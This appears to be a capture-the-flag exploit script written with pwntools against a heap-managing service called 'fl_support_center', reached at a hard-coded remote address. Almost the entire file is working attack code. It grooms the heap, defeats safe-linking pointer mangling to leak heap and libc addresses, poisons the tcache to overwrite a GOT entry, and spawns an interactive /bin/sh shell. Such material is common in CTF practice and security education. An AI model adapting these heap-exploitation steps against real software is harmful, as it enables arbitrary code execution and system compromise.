from pwn import *
# context.log_level='debug'
context.arch='amd64'
# context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
def XxX(leaked,page_off, orecal):
    if(page_off<0):
        neg=1
        page_off=-page_off
    else:
        neg=-1
    x1 = (page_off >> 24)
    x2 = ((page_off >> 12) & 0xfff)
    x3 = (page_off & 0xfff)
    A = leaked >> 36
    D = orecal
    G = (leaked & 0xfff) ^ D
    if(x3>G):
        JW1 = 1
    else:
        JW1 = 0 
    
    C = G + 0x1000 * JW1 + x3*neg
    F = ((leaked>>12)&0xfff) ^ C

    if( x2 > F-JW1 ):
        JW2 = 1
    else:
        JW2 = 0 
    B = F-JW1 + 0x1000 * JW2 + x2*neg
    # print(hex(leaked),hex(page_off),hex(JW2),hex(F))
    res = (A<<36) | (B <<24) | (C<<12) | D
    return res
# p=process('./fl_support_center')
p = remote("34.146.186.1",49867)
ru 		= lambda a: 	p.readuntil(a)
r 		= lambda n:		p.read(n)
sla 	= lambda a,b: 	p.sendlineafter(a,b)
sa 		= lambda a,b: 	p.sendafter(a,b)
sl		= lambda a: 	p.sendline(a)
s 		= lambda a: 	p.send(a)
def pack_tcache(i,v,pl):
    bitmap = [0]*0x80
    for x in range(len(i)):
       bitmap[i[x]*2] = v[x]
    return bytes(bitmap)+flat(pl)
def cmd(c):
    sla(b"> ",str(c).encode())
def add(name=b'n132'):
    cmd(1)
    sla(b": ",name)
def show():
    cmd(3)
def free(name=b'n132',c=b'A'*0x17):
    cmd(4)
    sla(b": ",name)
    pp = ru(b'\n')
    if b"T" == pp[0]:
        ru(b'\n')
        ru(b'\n')
        ru(b'\n')
        if b"yes or no" in ru(b'\n'):
            sl(b"yes")
            sla(b'\n',c)
        else:
            sl(c)
    elif b"lready blac" in pp:
        sla(b"Report: ",c)
def edit(name=b'n132',c=b'A'*0x17):
    cmd(2)
    sla(b": ",name)
    sla(b": ",c)
    if b"D" == p.read(1):
        sla(b"\n> ",'yes')
# Unsorted
for x in range(0x8):
    add(str(x).encode()*0x80)
    free(str(x).encode()*0x80)
    add(str(x).encode()*0x80)
for x in range(8):
    free(str(x).encode()*0x80,b"A"*0x101)
# Start
add(b"X"*0x4000)
add(b"\x88"*0xf0+p64(0xdeadbeefdeadbeef)[:7])
name = b'FL*Support*Center@fl.support.centeX'
add(name)
free(name)
add(name)
edit(name,b"x"*0xf7)
free(b"1"*0xf0)
free(name,b"FL*Support*Center@fl.support.center")
ru(b"age: ")
sfl = XxX(u64(p.read(8)),-1,0x40) 
warn(hex(sfl))
heap = sfl  - (0x555555575040-0x555555560000) 
sfl = (sfl>>12)-1
sla(b"> ",b'yes')
off = 0 
sla(b": \n",p64(sfl^(heap+0x10+off)))

pl = [0]*0x40
pl[12] = 0x555555574680 - 0x555555560000 +heap
pl[11] = heap+0x10
add(pack_tcache([11,12],[1,1],pl)[:0xf0])
warn(hex(heap))
payload = flat([0,0x00005555555722e0- 0x555555560000 +heap,0,0,0x555555574890+8- 0x555555560000 +heap,0x8,0x8,0,0,0,0]).ljust(0x100,b'\0')
add(payload[:0xd0])

cmd(3)
ru(b'Name: FL')
ru(b'Name: ')
libc = u64(p.read(8)) - (0x7ffff7a03b70-0x7ffff7800000)
libcpp = libc+0x400000
warn(hex(libc)) 
warn(hex(libcpp)) 

target  = libcpp + 0xa248 # getc got
pl = [0]*0x40
pl[4] = (0x7ffff7e77c10-0x7ffff7800000+libc)>>4<<4
warn(hex(pl[4]))
add(pack_tcache([4],[1],pl)[:0xc0])
# gdb.attach(p,'')

cmd(1)
ru(b'Name: ')
p.sendline(b"/bin/sh\0"+flat([0x7ffff7858740-0x7ffff7800000+libc]*8).ljust(0x40,b'\x22'))
p.interactive()